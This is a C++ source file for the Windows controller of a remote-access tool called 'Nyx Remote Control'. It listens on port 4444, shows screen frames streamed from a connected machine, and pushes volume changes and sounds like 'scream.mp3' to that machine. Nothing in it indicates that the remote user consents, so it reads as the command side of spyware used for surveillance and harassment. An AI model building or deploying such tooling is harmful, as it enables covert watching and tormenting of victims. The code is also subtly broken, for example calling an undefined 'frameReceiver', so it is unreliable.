// server.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <commctrl.h>        // for TRACKBAR_CLASS
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <fstream>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const int PORT = 4444;

// Global state
std::vector<BYTE> g_LatestFrame;
std::mutex g_FrameMutex;
SOCKET g_ClientSocket = INVALID_SOCKET;
std::mutex g_SocketMutex;

// Window handles
HWND g_hWnd;
HWND g_hSlider;

// Sound files to offer (must exist next to server.exe)
const char* g_SoundFiles[] = { "scream.mp3", "laugh.mp3", "alarm.mp3" };
const int g_NumSounds = sizeof(g_SoundFiles) / sizeof(g_SoundFiles[0]);

// ------------------------------------------------------------------
// Send a command packet to client
// ------------------------------------------------------------------
bool SendCommand(char cmd, const char* data, int dataLen) {
    std::lock_guard<std::mutex> lock(g_SocketMutex);
    if (g_ClientSocket == INVALID_SOCKET) return false;
    if (send(g_ClientSocket, &cmd, 1, 0) != 1) return false;
    if (dataLen > 0) {
        if (send(g_ClientSocket, data, dataLen, 0) != dataLen) return false;
    }
    return true;
}

bool SendVolume(int volPercent) {
    return SendCommand('V', (char*)&volPercent, sizeof(int));
}

bool SendPlaySound(const char* filename) {
    // Read the file and send it
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) return false;
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> buffer(size);
    if (!file.read(buffer.data(), size)) return false;

    // Send 'P' + size + data
    std::lock_guard<std::mutex> lock(g_SocketMutex);
    if (g_ClientSocket == INVALID_SOCKET) return false;
    if (send(g_ClientSocket, "P", 1, 0) != 1) return false;
    int sz = (int)size;
    if (send(g_ClientSocket, (char*)&sz, 4, 0) != 4) return false;
    if (send(g_ClientSocket, buffer.data(), (int)size, 0) != (int)size) return false;
    return true;
}

// ------------------------------------------------------------------
// Frame receiver thread
// ------------------------------------------------------------------
void FrameReceiver() {
    SOCKET listenSock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(listenSock, (sockaddr*)&addr, sizeof(addr));
    listen(listenSock, 1);

    while (true) {
        SOCKET client = accept(listenSock, NULL, NULL);
        if (client == INVALID_SOCKET) continue;

        {
            std::lock_guard<std::mutex> lock(g_SocketMutex);
            g_ClientSocket = client;
        }

        while (true) {
            int len;
            if (recv(client, (char*)&len, 4, 0) <= 0) break;
            if (len <= 0 || len > 10 * 1024 * 1024) break;
            std::vector<BYTE> buf(len);
            int total = 0;
            while (total < len) {
                int got = recv(client, (char*)buf.data() + total, len - total, 0);
                if (got <= 0) break;
                total += got;
            }
            if (total == len) {
                std::lock_guard<std::mutex> lock(g_FrameMutex);
                g_LatestFrame = std::move(buf);
            }
        }

        closesocket(client);
        {
            std::lock_guard<std::mutex> lock(g_SocketMutex);
            g_ClientSocket = INVALID_SOCKET;
        }
    }
}

// ------------------------------------------------------------------
// Window Procedure
// ------------------------------------------------------------------
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            // Create volume slider (trackbar)
            g_hSlider = CreateWindowW(TRACKBAR_CLASSW, NULL,
                WS_CHILD | WS_VISIBLE | TBS_HORZ | TBS_NOTICKS,
                10, 10, 200, 30, hWnd, (HMENU)101, NULL, NULL);
            SendMessage(g_hSlider, TBM_SETRANGE, TRUE, MAKELONG(0, 100));
            SendMessage(g_hSlider, TBM_SETPOS, TRUE, 50);

            // Create sound buttons
            for (int i = 0; i < g_NumSounds; ++i) {
                CreateWindowA("BUTTON", g_SoundFiles[i],
                    WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                    10, 50 + i * 30, 100, 25, hWnd, (HMENU)(200 + i), NULL, NULL);
            }
            return 0;
        }

        case WM_HSCROLL: {
            if ((HWND)lParam == g_hSlider) {
                int pos = (int)SendMessage(g_hSlider, TBM_GETPOS, 0, 0);
                SendVolume(pos);
            }
            return 0;
        }

        case WM_COMMAND: {
            int id = LOWORD(wParam);
            if (id >= 200 && id < 200 + g_NumSounds) {
                int idx = id - 200;
                if (!SendPlaySound(g_SoundFiles[idx])) {
                    MessageBoxA(hWnd, "Failed to send sound file!", "Error", 0);
                }
            }
            return 0;
        }

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // Draw background
            RECT rc;
            GetClientRect(hWnd, &rc);
            FillRect(hdc, &rc, (HBRUSH)(COLOR_WINDOW + 1));

            // Draw the latest frame (if any)
            std::vector<BYTE> frame;
            {
                std::lock_guard<std::mutex> lock(g_FrameMutex);
                frame = g_LatestFrame;
            }
            if (!frame.empty()) {
                // Create a GDI+ bitmap from the JPEG memory
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, frame.size());
                if (hMem) {
                    void* pMem = GlobalLock(hMem);
                    memcpy(pMem, frame.data(), frame.size());
                    GlobalUnlock(hMem);
                    IStream* pStream = NULL;
                    CreateStreamOnHGlobal(hMem, TRUE, &pStream);
                    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromStream(pStream);
                    if (bitmap && bitmap->GetLastStatus() == Gdiplus::Ok) {
                        Gdiplus::Graphics graphics(hdc);
                        // Scale to fit window (keep aspect)
                        int bmpW = bitmap->GetWidth();
                        int bmpH = bitmap->GetHeight();
                        int winW = rc.right - rc.left;
                        int winH = rc.bottom - rc.top;
                        // Buttons & slider at top, so shift drawing down
                        int offsetY = 120; // height of controls
                        int availH = winH - offsetY;
                        if (availH <= 0) availH = 1;
                        float scale = min((float)winW / bmpW, (float)availH / bmpH);
                        int drawW = (int)(bmpW * scale);
                        int drawH = (int)(bmpH * scale);
                        int drawX = (winW - drawW) / 2;
                        int drawY = offsetY + (availH - drawH) / 2;
                        graphics.DrawImage(bitmap, drawX, drawY, drawW, drawH);
                    }
                    delete bitmap;
                    pStream->Release();
                }
            }
            EndPaint(hWnd, &ps);
            return 0;
        }

        case WM_SIZE:
            InvalidateRect(hWnd, NULL, TRUE);
            return 0;

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

// ------------------------------------------------------------------
// WinMain
// ------------------------------------------------------------------
int main() {
    // GDI+ startup
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Init common controls for trackbar
    INITCOMMONCONTROLSEX icex{ sizeof(icex), ICC_BAR_CLASSES };
    InitCommonControlsEx(&icex);

    // Start frame receiver thread
    std::thread(frameReceiver).detach();

    // Register window class
    WNDCLASSEX wc = { sizeof(wc) };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"NyxServerWindow";
    RegisterClassEx(&wc);

    g_hWnd = CreateWindowEx(0, L"NyxServerWindow", L"Nyx Remote Control",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
        NULL, NULL, wc.hInstance, NULL);

    if (!g_hWnd) return 1;
    ShowWindow(g_hWnd, SW_SHOW);
    UpdateWindow(g_hWnd);

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
    return (int)msg.wParam;
}